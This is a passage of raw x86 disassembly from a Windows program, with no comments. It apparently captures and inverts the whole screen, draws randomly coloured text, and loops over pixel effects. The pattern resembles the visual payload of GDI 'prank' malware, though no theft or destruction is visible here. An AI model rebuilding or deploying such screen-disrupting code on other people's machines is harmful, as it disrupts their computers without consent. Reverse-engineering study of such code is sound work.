  402bc7:	2b 44 24 20          	sub    0x20(%esp),%eax
  402bcb:	8b 7d 08             	mov    0x8(%ebp),%edi
  402bce:	68 85 00 00 00       	push   $0x85
  402bd3:	89 44 24 18          	mov    %eax,0x18(%esp)
  402bd7:	8b 44 24 30          	mov    0x30(%esp),%eax
  402bdb:	2b 44 24 28          	sub    0x28(%esp),%eax
  402bdf:	6a 00                	push   $0x0
  402be1:	c1 e7 04             	shl    $0x4,%edi
  402be4:	2b 7d 08             	sub    0x8(%ebp),%edi
  402be7:	6a 00                	push   $0x0
  402be9:	6a 00                	push   $0x0
  402beb:	89 44 24 20          	mov    %eax,0x20(%esp)
  402bef:	03 ff                	add    %edi,%edi
  402bf1:	ff 15 6c 01 41 00    	call   *0x41016c
  402bf7:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402bfb:	56                   	push   %esi
  402bfc:	ff 15 1c 00 41 00    	call   *0x41001c
  402c02:	ff 74 24 10          	push   0x10(%esp)
  402c06:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402c0a:	ff 74 24 18          	push   0x18(%esp)
  402c0e:	56                   	push   %esi
  402c0f:	ff 15 10 00 41 00    	call   *0x410010
  402c15:	8b 35 14 00 41 00    	mov    0x410014,%esi
  402c1b:	50                   	push   %eax
  402c1c:	ff 74 24 1c          	push   0x1c(%esp)
  402c20:	89 44 24 24          	mov    %eax,0x24(%esp)
  402c24:	ff d6                	call   *%esi
  402c26:	6a 32                	push   $0x32
  402c28:	ff 15 a8 00 41 00    	call   *0x4100a8
  402c2e:	68 08 00 33 00       	push   $0x330008
  402c33:	6a 00                	push   $0x0
  402c35:	6a 00                	push   $0x0
  402c37:	ff 74 24 18          	push   0x18(%esp)
  402c3b:	ff 74 24 20          	push   0x20(%esp)
  402c3f:	ff 74 24 28          	push   0x28(%esp)
  402c43:	6a 00                	push   $0x0
  402c45:	6a 00                	push   $0x0
  402c47:	ff 74 24 38          	push   0x38(%esp)
  402c4b:	ff 15 0c 00 41 00    	call   *0x41000c
  402c51:	ff 74 24 1c          	push   0x1c(%esp)
  402c55:	ff 15 30 00 41 00    	call   *0x410030
  402c5b:	50                   	push   %eax
  402c5c:	ff 74 24 10          	push   0x10(%esp)
  402c60:	ff d6                	call   *%esi
  402c62:	8b c7                	mov    %edi,%eax
  402c64:	99                   	cltd
  402c65:	f7 7c 24 10          	idivl  0x10(%esp)
  402c69:	b8 cb f0 8d 28       	mov    $0x288df0cb,%eax
  402c6e:	8b f2                	mov    %edx,%esi
  402c70:	f7 ef                	imul   %edi
  402c72:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  402c76:	c1 fa 04             	sar    $0x4,%edx
  402c79:	8b c2                	mov    %edx,%eax
  402c7b:	c1 e8 1f             	shr    $0x1f,%eax
  402c7e:	03 c2                	add    %edx,%eax
  402c80:	6b c8 65             	imul   $0x65,%eax,%ecx
  402c83:	8b c7                	mov    %edi,%eax
  402c85:	2b f1                	sub    %ecx,%esi
  402c87:	03 f7                	add    %edi,%esi
  402c89:	99                   	cltd
  402c8a:	f7 7c 24 14          	idivl  0x14(%esp)
  402c8e:	8b c2                	mov    %edx,%eax
  402c90:	89 54 24 38          	mov    %edx,0x38(%esp)
  402c94:	2b c1                	sub    %ecx,%eax
  402c96:	03 f8                	add    %eax,%edi
  402c98:	8d 86 b4 00 00 00    	lea    0xb4(%esi),%eax
  402c9e:	50                   	push   %eax
  402c9f:	8d 87 b4 00 00 00    	lea    0xb4(%edi),%eax
  402ca5:	50                   	push   %eax
  402ca6:	8b 44 24 44          	mov    0x44(%esp),%eax
  402caa:	83 c0 14             	add    $0x14,%eax
  402cad:	50                   	push   %eax
  402cae:	8d 42 14             	lea    0x14(%edx),%eax
  402cb1:	50                   	push   %eax
  402cb2:	ff 74 24 1c          	push   0x1c(%esp)
  402cb6:	ff 15 44 00 41 00    	call   *0x410044
  402cbc:	68 08 00 33 00       	push   $0x330008
  402cc1:	6a 00                	push   $0x0
  402cc3:	6a 00                	push   $0x0
  402cc5:	ff 74 24 18          	push   0x18(%esp)
  402cc9:	ff 74 24 20          	push   0x20(%esp)
  402ccd:	ff 74 24 28          	push   0x28(%esp)
  402cd1:	6a 00                	push   $0x0
  402cd3:	6a 00                	push   $0x0
  402cd5:	ff 74 24 38          	push   0x38(%esp)
  402cd9:	ff 15 0c 00 41 00    	call   *0x41000c
  402cdf:	ff 74 24 1c          	push   0x1c(%esp)
  402ce3:	ff 15 30 00 41 00    	call   *0x410030
  402ce9:	50                   	push   %eax
  402cea:	ff 74 24 10          	push   0x10(%esp)
  402cee:	ff 15 14 00 41 00    	call   *0x410014
  402cf4:	8d 86 be 00 00 00    	lea    0xbe(%esi),%eax
  402cfa:	50                   	push   %eax
  402cfb:	8d 87 be 00 00 00    	lea    0xbe(%edi),%eax
  402d01:	50                   	push   %eax
  402d02:	8b 44 24 44          	mov    0x44(%esp),%eax
  402d06:	83 c0 0a             	add    $0xa,%eax
  402d09:	50                   	push   %eax
  402d0a:	8b 44 24 44          	mov    0x44(%esp),%eax
  402d0e:	83 c0 0a             	add    $0xa,%eax
  402d11:	50                   	push   %eax
  402d12:	ff 74 24 1c          	push   0x1c(%esp)
  402d16:	ff 15 44 00 41 00    	call   *0x410044
  402d1c:	81 c6 c8 00 00 00    	add    $0xc8,%esi
  402d22:	81 c7 c8 00 00 00    	add    $0xc8,%edi
  402d28:	56                   	push   %esi
  402d29:	57                   	push   %edi
  402d2a:	ff 74 24 44          	push   0x44(%esp)
  402d2e:	ff 74 24 44          	push   0x44(%esp)
  402d32:	ff 74 24 1c          	push   0x1c(%esp)
  402d36:	ff 15 44 00 41 00    	call   *0x410044
  402d3c:	68 08 00 33 00       	push   $0x330008
  402d41:	6a 00                	push   $0x0
  402d43:	6a 00                	push   $0x0
  402d45:	ff 74 24 18          	push   0x18(%esp)
  402d49:	ff 74 24 20          	push   0x20(%esp)
  402d4d:	ff 74 24 28          	push   0x28(%esp)
  402d51:	6a 00                	push   $0x0
  402d53:	6a 00                	push   $0x0
  402d55:	ff 74 24 38          	push   0x38(%esp)
  402d59:	ff 15 0c 00 41 00    	call   *0x41000c
  402d5f:	ff 74 24 1c          	push   0x1c(%esp)
  402d63:	ff 15 30 00 41 00    	call   *0x410030
  402d69:	50                   	push   %eax
  402d6a:	ff 74 24 10          	push   0x10(%esp)
  402d6e:	ff 15 14 00 41 00    	call   *0x410014
  402d74:	56                   	push   %esi
  402d75:	57                   	push   %edi
  402d76:	ff 74 24 44          	push   0x44(%esp)
  402d7a:	ff 74 24 44          	push   0x44(%esp)
  402d7e:	ff 74 24 1c          	push   0x1c(%esp)
  402d82:	ff 15 44 00 41 00    	call   *0x410044
  402d88:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402d8d:	8b 3d 04 00 41 00    	mov    0x410004,%edi
  402d93:	85 c0                	test   %eax,%eax
  402d95:	75 23                	jne    0x402dba
  402d97:	68 40 00 00 f0       	push   $0xf0000040
  402d9c:	6a 01                	push   $0x1
  402d9e:	6a 00                	push   $0x0
  402da0:	6a 00                	push   $0x0
  402da2:	68 f8 81 41 00       	push   $0x4181f8
  402da7:	ff d7                	call   *%edi
  402da9:	85 c0                	test   %eax,%eax
  402dab:	75 08                	jne    0x402db5
  402dad:	6a 01                	push   $0x1
  402daf:	ff 15 94 00 41 00    	call   *0x410094
  402db5:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402dba:	8b 35 00 00 41 00    	mov    0x410000,%esi
  402dc0:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  402dc4:	51                   	push   %ecx
  402dc5:	6a 04                	push   $0x4
  402dc7:	50                   	push   %eax
  402dc8:	ff d6                	call   *%esi
  402dca:	8b 44 24 38          	mov    0x38(%esp),%eax
  402dce:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402dd3:	89 44 24 44          	mov    %eax,0x44(%esp)
  402dd7:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402ddc:	85 c0                	test   %eax,%eax
  402dde:	75 21                	jne    0x402e01
  402de0:	68 40 00 00 f0       	push   $0xf0000040
  402de5:	6a 01                	push   $0x1
  402de7:	50                   	push   %eax
  402de8:	50                   	push   %eax
  402de9:	68 f8 81 41 00       	push   $0x4181f8
  402dee:	ff d7                	call   *%edi
  402df0:	85 c0                	test   %eax,%eax
  402df2:	75 08                	jne    0x402dfc
  402df4:	6a 01                	push   $0x1
  402df6:	ff 15 94 00 41 00    	call   *0x410094
  402dfc:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402e01:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  402e05:	51                   	push   %ecx
  402e06:	6a 04                	push   $0x4
  402e08:	50                   	push   %eax
  402e09:	ff d6                	call   *%esi
  402e0b:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402e0f:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402e14:	89 44 24 40          	mov    %eax,0x40(%esp)
  402e18:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402e1d:	85 c0                	test   %eax,%eax
  402e1f:	75 21                	jne    0x402e42
  402e21:	68 40 00 00 f0       	push   $0xf0000040
  402e26:	6a 01                	push   $0x1
  402e28:	50                   	push   %eax
  402e29:	50                   	push   %eax
  402e2a:	68 f8 81 41 00       	push   $0x4181f8
  402e2f:	ff d7                	call   *%edi
  402e31:	85 c0                	test   %eax,%eax
  402e33:	75 08                	jne    0x402e3d
  402e35:	6a 01                	push   $0x1
  402e37:	ff 15 94 00 41 00    	call   *0x410094
  402e3d:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402e42:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  402e46:	51                   	push   %ecx
  402e47:	6a 04                	push   $0x4
  402e49:	50                   	push   %eax
  402e4a:	ff d6                	call   *%esi
  402e4c:	0f b6 4c 24 48       	movzbl 0x48(%esp),%ecx
  402e51:	8b 44 24 40          	mov    0x40(%esp),%eax
  402e55:	c1 e1 08             	shl    $0x8,%ecx
  402e58:	0f b6 c0             	movzbl %al,%eax
  402e5b:	0b c8                	or     %eax,%ecx
  402e5d:	8b 44 24 44          	mov    0x44(%esp),%eax
  402e61:	c1 e1 08             	shl    $0x8,%ecx
  402e64:	0f b6 c0             	movzbl %al,%eax
  402e67:	0b c8                	or     %eax,%ecx
  402e69:	51                   	push   %ecx
  402e6a:	ff 74 24 10          	push   0x10(%esp)
  402e6e:	ff 15 40 00 41 00    	call   *0x410040
  402e74:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402e79:	85 c0                	test   %eax,%eax
  402e7b:	75 21                	jne    0x402e9e
  402e7d:	68 40 00 00 f0       	push   $0xf0000040
  402e82:	6a 01                	push   $0x1
  402e84:	50                   	push   %eax
  402e85:	50                   	push   %eax
  402e86:	68 f8 81 41 00       	push   $0x4181f8
  402e8b:	ff d7                	call   *%edi
  402e8d:	85 c0                	test   %eax,%eax
  402e8f:	75 08                	jne    0x402e99
  402e91:	6a 01                	push   $0x1
  402e93:	ff 15 94 00 41 00    	call   *0x410094
  402e99:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402e9e:	8d 4c 24 44          	lea    0x44(%esp),%ecx
  402ea2:	51                   	push   %ecx
  402ea3:	6a 04                	push   $0x4
  402ea5:	50                   	push   %eax
  402ea6:	ff d6                	call   *%esi
  402ea8:	8b 44 24 44          	mov    0x44(%esp),%eax
  402eac:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402eb1:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  402eb5:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402eba:	85 c0                	test   %eax,%eax
  402ebc:	75 21                	jne    0x402edf
  402ebe:	68 40 00 00 f0       	push   $0xf0000040
  402ec3:	6a 01                	push   $0x1
  402ec5:	50                   	push   %eax
  402ec6:	50                   	push   %eax
  402ec7:	68 f8 81 41 00       	push   $0x4181f8
  402ecc:	ff d7                	call   *%edi
  402ece:	85 c0                	test   %eax,%eax
  402ed0:	75 08                	jne    0x402eda
  402ed2:	6a 01                	push   $0x1
  402ed4:	ff 15 94 00 41 00    	call   *0x410094
  402eda:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402edf:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  402ee3:	51                   	push   %ecx
  402ee4:	6a 04                	push   $0x4
  402ee6:	50                   	push   %eax
  402ee7:	ff d6                	call   *%esi
  402ee9:	8b 44 24 40          	mov    0x40(%esp),%eax
  402eed:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402ef2:	89 44 24 38          	mov    %eax,0x38(%esp)
  402ef6:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402efb:	85 c0                	test   %eax,%eax
  402efd:	75 21                	jne    0x402f20
  402eff:	68 40 00 00 f0       	push   $0xf0000040
  402f04:	6a 01                	push   $0x1
  402f06:	50                   	push   %eax
  402f07:	50                   	push   %eax
  402f08:	68 f8 81 41 00       	push   $0x4181f8
  402f0d:	ff d7                	call   *%edi
  402f0f:	85 c0                	test   %eax,%eax
  402f11:	75 08                	jne    0x402f1b
  402f13:	6a 01                	push   $0x1
  402f15:	ff 15 94 00 41 00    	call   *0x410094
  402f1b:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402f20:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  402f24:	51                   	push   %ecx
  402f25:	6a 04                	push   $0x4
  402f27:	50                   	push   %eax
  402f28:	ff d6                	call   *%esi
  402f2a:	0f b6 4c 24 48       	movzbl 0x48(%esp),%ecx
  402f2f:	8b 44 24 38          	mov    0x38(%esp),%eax
  402f33:	c1 e1 08             	shl    $0x8,%ecx
  402f36:	0f b6 c0             	movzbl %al,%eax
  402f39:	0b c8                	or     %eax,%ecx
  402f3b:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402f3f:	c1 e1 08             	shl    $0x8,%ecx
  402f42:	0f b6 c0             	movzbl %al,%eax
  402f45:	0b c8                	or     %eax,%ecx
  402f47:	51                   	push   %ecx
  402f48:	ff 74 24 10          	push   0x10(%esp)
  402f4c:	ff 15 3c 00 41 00    	call   *0x41003c
  402f52:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%esp)
  402f59:	00 
  402f5a:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  402f60:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402f65:	85 c0                	test   %eax,%eax
  402f67:	75 1d                	jne    0x402f86
  402f69:	68 40 00 00 f0       	push   $0xf0000040
  402f6e:	6a 01                	push   $0x1
  402f70:	50                   	push   %eax
  402f71:	50                   	push   %eax
  402f72:	68 f8 81 41 00       	push   $0x4181f8
  402f77:	ff d7                	call   *%edi
  402f79:	85 c0                	test   %eax,%eax
  402f7b:	0f 84 2c fe ff ff    	je     0x402dad
  402f81:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402f86:	8d 4c 24 44          	lea    0x44(%esp),%ecx
  402f8a:	51                   	push   %ecx
  402f8b:	6a 04                	push   $0x4
  402f8d:	50                   	push   %eax
  402f8e:	ff d6                	call   *%esi
  402f90:	8b 74 24 44          	mov    0x44(%esp),%esi
  402f94:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402f99:	81 e6 ff ff ff 7f    	and    $0x7fffffff,%esi
  402f9f:	85 c0                	test   %eax,%eax
  402fa1:	75 1d                	jne    0x402fc0
  402fa3:	68 40 00 00 f0       	push   $0xf0000040
  402fa8:	6a 01                	push   $0x1
  402faa:	50                   	push   %eax
  402fab:	50                   	push   %eax
  402fac:	68 f8 81 41 00       	push   $0x4181f8
  402fb1:	ff d7                	call   *%edi
  402fb3:	85 c0                	test   %eax,%eax
  402fb5:	0f 84 f2 fd ff ff    	je     0x402dad
  402fbb:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  402fc0:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  402fc4:	51                   	push   %ecx
  402fc5:	6a 04                	push   $0x4
  402fc7:	50                   	push   %eax
  402fc8:	ff 15 00 00 41 00    	call   *0x410000
  402fce:	8b c6                	mov    %esi,%eax
  402fd0:	99                   	cltd
  402fd1:	f7 7c 24 10          	idivl  0x10(%esp)
  402fd5:	8b 44 24 40          	mov    0x40(%esp),%eax
  402fd9:	6a 05                	push   $0x5
  402fdb:	68 a0 4e 41 00       	push   $0x414ea0
  402fe0:	52                   	push   %edx
  402fe1:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402fe6:	99                   	cltd
  402fe7:	f7 7c 24 20          	idivl  0x20(%esp)
  402feb:	52                   	push   %edx
  402fec:	ff 74 24 1c          	push   0x1c(%esp)
  402ff0:	ff 15 38 00 41 00    	call   *0x410038
  402ff6:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  402ffa:	41                   	inc    %ecx
  402ffb:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  402fff:	83 f9 05             	cmp    $0x5,%ecx
  403002:	7d 0b                	jge    0x40300f
  403004:	8b 35 00 00 41 00    	mov    0x410000,%esi
  40300a:	e9 51 ff ff ff       	jmp    0x402f60
  40300f:	ff 74 24 18          	push   0x18(%esp)
  403013:	8b 35 48 00 41 00    	mov    0x410048,%esi
  403019:	ff d6                	call   *%esi
  40301b:	ff 74 24 1c          	push   0x1c(%esp)
  40301f:	ff d6                	call   *%esi
  403021:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  403025:	5f                   	pop    %edi
  403026:	5e                   	pop    %esi
  403027:	33 cc                	xor    %esp,%ecx
  403029:	e8 3c 12 00 00       	call   0x40426a
  40302e:	8b e5                	mov    %ebp,%esp
  403030:	5d                   	pop    %ebp
  403031:	c3                   	ret
  403032:	cc                   	int3
  403033:	cc                   	int3
  403034:	cc                   	int3
  403035:	cc                   	int3
  403036:	cc                   	int3
  403037:	cc                   	int3
  403038:	cc                   	int3
  403039:	cc                   	int3
  40303a:	cc                   	int3
  40303b:	cc                   	int3
  40303c:	cc                   	int3
  40303d:	cc                   	int3
  40303e:	cc                   	int3
  40303f:	cc                   	int3
  403040:	55                   	push   %ebp
  403041:	8b ec                	mov    %esp,%ebp
  403043:	83 ec 64             	sub    $0x64,%esp
  403046:	a1 04 70 41 00       	mov    0x417004,%eax
  40304b:	33 c5                	xor    %ebp,%eax
  40304d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403050:	53                   	push   %ebx
  403051:	8b 1d fc 81 41 00    	mov    0x4181fc,%ebx
  403057:	56                   	push   %esi
  403058:	57                   	push   %edi
  403059:	6a 00                	push   $0x0
  40305b:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  40305e:	ff 15 84 01 41 00    	call   *0x410184
  403064:	8b 35 80 01 41 00    	mov    0x410180,%esi
  40306a:	8b f8                	mov    %eax,%edi
  40306c:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40306f:	0f 57 c0             	xorps  %xmm0,%xmm0
  403072:	50                   	push   %eax
  403073:	68 50 42 40 00       	push   $0x404250
  403078:	6a 00                	push   $0x0
  40307a:	6a 00                	push   $0x0
  40307c:	0f 11 45 a0          	movups %xmm0,-0x60(%ebp)
  403080:	ff d6                	call   *%esi
  403082:	8d 45 a0             	lea    -0x60(%ebp),%eax
  403085:	0f 57 c0             	xorps  %xmm0,%xmm0
  403088:	50                   	push   %eax
  403089:	68 50 42 40 00       	push   $0x404250
  40308e:	6a 00                	push   $0x0
  403090:	6a 00                	push   $0x0
  403092:	0f 11 45 a0          	movups %xmm0,-0x60(%ebp)
  403096:	ff d6                	call   *%esi
  403098:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40309b:	0f 57 c0             	xorps  %xmm0,%xmm0
  40309e:	2b 45 a0             	sub    -0x60(%ebp),%eax
  4030a1:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  4030a4:	2b 4d a4             	sub    -0x5c(%ebp),%ecx
  4030a7:	0f 11 45 d4          	movups %xmm0,-0x2c(%ebp)
  4030ab:	57                   	push   %edi
  4030ac:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4030af:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  4030b2:	0f 11 45 e4          	movups %xmm0,-0x1c(%ebp)
  4030b6:	c7 45 d0 2c 00 00 00 	movl   $0x2c,-0x30(%ebp)
  4030bd:	66 0f d6 45 f4       	movq   %xmm0,-0xc(%ebp)
  4030c2:	c7 45 dc 01 00 20 00 	movl   $0x200001,-0x24(%ebp)
  4030c9:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4030cc:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4030cf:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  4030d6:	ff 15 1c 00 41 00    	call   *0x41001c
  4030dc:	6a 00                	push   $0x0
  4030de:	8b f0                	mov    %eax,%esi
  4030e0:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4030e3:	6a 00                	push   $0x0
  4030e5:	50                   	push   %eax
  4030e6:	6a 00                	push   $0x0
  4030e8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4030eb:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  4030ee:	50                   	push   %eax
  4030ef:	57                   	push   %edi
  4030f0:	ff 15 18 00 41 00    	call   *0x410018
  4030f6:	50                   	push   %eax
  4030f7:	56                   	push   %esi
  4030f8:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4030fb:	ff 15 14 00 41 00    	call   *0x410014
  403101:	8d 43 1e             	lea    0x1e(%ebx),%eax
  403104:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  40310b:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  40310e:	39 05 fc 81 41 00    	cmp    %eax,0x4181fc
  403114:	73 7d                	jae    0x403193
  403116:	8b 5d c0             	mov    -0x40(%ebp),%ebx
  403119:	8b 7d bc             	mov    -0x44(%ebp),%edi
  40311c:	0f 1f 40 00          	nopl   0x0(%eax)
  403120:	6a 00                	push   $0x0
  403122:	ff 15 84 01 41 00    	call   *0x410184
  403128:	68 20 00 cc 00       	push   $0xcc0020
  40312d:	6a 00                	push   $0x0
  40312f:	6a 00                	push   $0x0
  403131:	8b f0                	mov    %eax,%esi
  403133:	56                   	push   %esi
  403134:	57                   	push   %edi
  403135:	53                   	push   %ebx
  403136:	6a 00                	push   $0x0
  403138:	6a 00                	push   $0x0
  40313a:	ff 75 c4             	push   -0x3c(%ebp)
  40313d:	ff 15 0c 00 41 00    	call   *0x41000c
  403143:	ff 75 cc             	push   -0x34(%ebp)
  403146:	57                   	push   %edi
  403147:	53                   	push   %ebx
  403148:	ff 75 c8             	push   -0x38(%ebp)
  40314b:	ff 55 b8             	call   *-0x48(%ebp)
  40314e:	83 c4 10             	add    $0x10,%esp
  403151:	68 20 00 cc 00       	push   $0xcc0020
  403156:	6a 00                	push   $0x0
  403158:	6a 00                	push   $0x0
  40315a:	ff 75 c4             	push   -0x3c(%ebp)
  40315d:	57                   	push   %edi
  40315e:	53                   	push   %ebx
  40315f:	6a 00                	push   $0x0
  403161:	6a 00                	push   $0x0
  403163:	56                   	push   %esi
  403164:	ff 15 0c 00 41 00    	call   *0x41000c
  40316a:	56                   	push   %esi
  40316b:	6a 00                	push   $0x0
  40316d:	ff 15 70 01 41 00    	call   *0x410170
  403173:	56                   	push   %esi
  403174:	ff 15 48 00 41 00    	call   *0x410048
  40317a:	6a 0a                	push   $0xa
  40317c:	ff 15 a8 00 41 00    	call   *0x4100a8
  403182:	ff 45 c8             	incl   -0x38(%ebp)
  403185:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  403188:	39 05 fc 81 41 00    	cmp    %eax,0x4181fc
  40318e:	72 90                	jb     0x403120
  403190:	8b 75 c4             	mov    -0x3c(%ebp),%esi
  403193:	ff 75 b0             	push   -0x50(%ebp)
  403196:	ff 15 48 00 41 00    	call   *0x410048
  40319c:	56                   	push   %esi
  40319d:	ff 15 34 00 41 00    	call   *0x410034
  4031a3:	68 85 00 00 00       	push   $0x85
  4031a8:	6a 00                	push   $0x0
  4031aa:	6a 00                	push   $0x0
  4031ac:	6a 00                	push   $0x0
  4031ae:	ff 15 6c 01 41 00    	call   *0x41016c
  4031b4:	6a 64                	push   $0x64
  4031b6:	ff 15 a8 00 41 00    	call   *0x4100a8
  4031bc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4031bf:	5f                   	pop    %edi
  4031c0:	5e                   	pop    %esi
  4031c1:	33 cd                	xor    %ebp,%ecx
  4031c3:	5b                   	pop    %ebx
  4031c4:	e8 a1 10 00 00       	call   0x40426a
  4031c9:	8b e5                	mov    %ebp,%esp
  4031cb:	5d                   	pop    %ebp
  4031cc:	c3                   	ret
  4031cd:	cc                   	int3
  4031ce:	cc                   	int3
  4031cf:	cc                   	int3
  4031d0:	55                   	push   %ebp
  4031d1:	8b ec                	mov    %esp,%ebp
  4031d3:	56                   	push   %esi
  4031d4:	8b 75 0c             	mov    0xc(%ebp),%esi
  4031d7:	33 c9                	xor    %ecx,%ecx
  4031d9:	0f af 75 10          	imul   0x10(%ebp),%esi
  4031dd:	85 f6                	test   %esi,%esi
  4031df:	0f 8e 7f 01 00 00    	jle    0x403364
  4031e5:	53                   	push   %ebx
  4031e6:	57                   	push   %edi
  4031e7:	8b 7d 14             	mov    0x14(%ebp),%edi
  4031ea:	83 fe 08             	cmp    $0x8,%esi
  4031ed:	0f 82 55 01 00 00    	jb     0x403348
  4031f3:	83 3d 54 7b 41 00 02 	cmpl   $0x2,0x417b54
  4031fa:	0f 8c 48 01 00 00    	jl     0x403348
  403200:	8b c6                	mov    %esi,%eax
  403202:	25 07 00 00 80       	and    $0x80000007,%eax
  403207:	79 05                	jns    0x40320e
  403209:	48                   	dec    %eax
  40320a:	83 c8 f8             	or     $0xfffffff8,%eax
  40320d:	40                   	inc    %eax
  40320e:	0f 28 25 e0 4e 41 00 	movaps 0x414ee0,%xmm4
  403215:	8d 57 08             	lea    0x8(%edi),%edx
  403218:	0f 28 2d f0 4e 41 00 	movaps 0x414ef0,%xmm5
  40321f:	8b de                	mov    %esi,%ebx
  403221:	2b d8                	sub    %eax,%ebx
  403223:	b8 01 00 00 00       	mov    $0x1,%eax
  403228:	66 0f 6e f0          	movd   %eax,%xmm6
  40322c:	b8 17 00 00 00       	mov    $0x17,%eax
  403231:	66 0f 6e f8          	movd   %eax,%xmm7
  403235:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%eax,%eax,1)
  40323c:	00 00 00 00 
  403240:	66 0f 6e 52 04       	movd   0x4(%edx),%xmm2
  403245:	8d 52 20             	lea    0x20(%edx),%edx
  403248:	66 0f 6e 42 e0       	movd   -0x20(%edx),%xmm0
  40324d:	83 c1 08             	add    $0x8,%ecx
  403250:	66 0f 6e 4a dc       	movd   -0x24(%edx),%xmm1
  403255:	66 0f 6e 5a d8       	movd   -0x28(%edx),%xmm3
  40325a:	66 0f 62 d8          	punpckldq %xmm0,%xmm3
  40325e:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  403262:	66 0f 62 d9          	punpckldq %xmm1,%xmm3
  403266:	66 0f fe db          	paddd  %xmm3,%xmm3
  40326a:	0f 28 cb             	movaps %xmm3,%xmm1
  40326d:	0f 28 c3             	movaps %xmm3,%xmm0
  403270:	66 0f 6a c3          	punpckhdq %xmm3,%xmm0
  403274:	66 0f 62 cb          	punpckldq %xmm3,%xmm1
  403278:	66 0f f4 c4          	pmuludq %xmm4,%xmm0
  40327c:	66 0f f4 cc          	pmuludq %xmm4,%xmm1
  403280:	0f c6 c8 dd          	shufps $0xdd,%xmm0,%xmm1
  403284:	0f 28 c3             	movaps %xmm3,%xmm0
  403287:	66 0f fa c1          	psubd  %xmm1,%xmm0
  40328b:	66 0f d2 c6          	psrld  %xmm6,%xmm0
  40328f:	66 0f fe c1          	paddd  %xmm1,%xmm0
  403293:	66 0f d2 c7          	psrld  %xmm7,%xmm0
  403297:	66 0f 38 40 c5       	pmulld %xmm5,%xmm0
  40329c:	66 0f fa d8          	psubd  %xmm0,%xmm3
  4032a0:	66 0f 7e 5a d8       	movd   %xmm3,-0x28(%edx)
  4032a5:	66 0f 73 db 04       	psrldq $0x4,%xmm3
  4032aa:	66 0f 7e 5a dc       	movd   %xmm3,-0x24(%edx)
  4032af:	66 0f 6e 4a ec       	movd   -0x14(%edx),%xmm1
  4032b4:	66 0f 73 db 04       	psrldq $0x4,%xmm3
  4032b9:	66 0f 7e 5a e0       	movd   %xmm3,-0x20(%edx)
  4032be:	66 0f 6e 42 f0       	movd   -0x10(%edx),%xmm0
  4032c3:	66 0f 73 db 04       	psrldq $0x4,%xmm3
  4032c8:	66 0f 7e 5a e4       	movd   %xmm3,-0x1c(%edx)
  4032cd:	66 0f 6e 52 f4       	movd   -0xc(%edx),%xmm2
  4032d2:	66 0f 6e 5a e8       	movd   -0x18(%edx),%xmm3
  4032d7:	66 0f 62 d8          	punpckldq %xmm0,%xmm3
  4032db:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  4032df:	66 0f 62 d9          	punpckldq %xmm1,%xmm3
  4032e3:	66 0f fe db          	paddd  %xmm3,%xmm3
  4032e7:	0f 28 cb             	movaps %xmm3,%xmm1
  4032ea:	0f 28 c3             	movaps %xmm3,%xmm0
  4032ed:	66 0f 6a c3          	punpckhdq %xmm3,%xmm0
  4032f1:	66 0f 62 cb          	punpckldq %xmm3,%xmm1
  4032f5:	66 0f f4 c4          	pmuludq %xmm4,%xmm0
  4032f9:	66 0f f4 cc          	pmuludq %xmm4,%xmm1
  4032fd:	0f c6 c8 dd          	shufps $0xdd,%xmm0,%xmm1
  403301:	0f 28 c3             	movaps %xmm3,%xmm0
  403304:	66 0f fa c1          	psubd  %xmm1,%xmm0
